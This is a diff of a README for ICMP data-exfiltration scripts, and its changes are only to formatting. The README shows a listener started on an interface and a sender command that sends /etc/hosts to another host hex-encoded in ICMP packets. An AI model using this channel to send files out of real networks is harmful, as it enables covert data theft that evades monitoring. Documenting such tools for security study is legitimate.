@@ -30,14 +30,14 @@ to the script, and it will automatically convert our data into "HEXADECIMAL" and
 ```bash
 ❯ sudo python3 icmp_exfiltration.py
 
-[!] Usage icmp_exfiltration.py <Interface-Name>                               
+┃  [!] Usage icmp_exfiltration.py <Interface-Name>                             
 ```
 
 #### icmp_sendData.py
 ```bash
 ❯ sudo python3 icmp_sendData.py
 
-[!] Usage icmp_sendData.py <IP-Address> <File-Name>                            
+┃  [!] Usage icmp_sendData.py <IP-Address> <File-Name>                       
 ```
 
 ### Usage
@@ -45,7 +45,7 @@ to the script, and it will automatically convert our data into "HEXADECIMAL" and
 ```bash
 ❯ sudo python3 icmp_exfiltration.py wlan0
 
-[*] Listening for any incoming connections...
+┃ [*] Listening for any incoming connections...
 
 127.0.0.1       localhost
 127.0.1.1       Gurpreet06                        
@@ -56,9 +56,9 @@ First we run the "icmp_exfiltration.py" file specifying which interface we want 
 ```bash
 ❯ python3 icmp_sendData.py 172.16.223.1 /etc/hosts
 
-[+] Trying to send file...
+┃  [+] Trying to send file...
 
-[+] File sent successfully.                        
+┃  [+] File sent successfully.                        
 ```
 Then from another host we will run the "icmp_sendData.py" script by providing the destination "IP-Address" and "FILE NAME"
 and it will automatically send  the file to another host terminal.
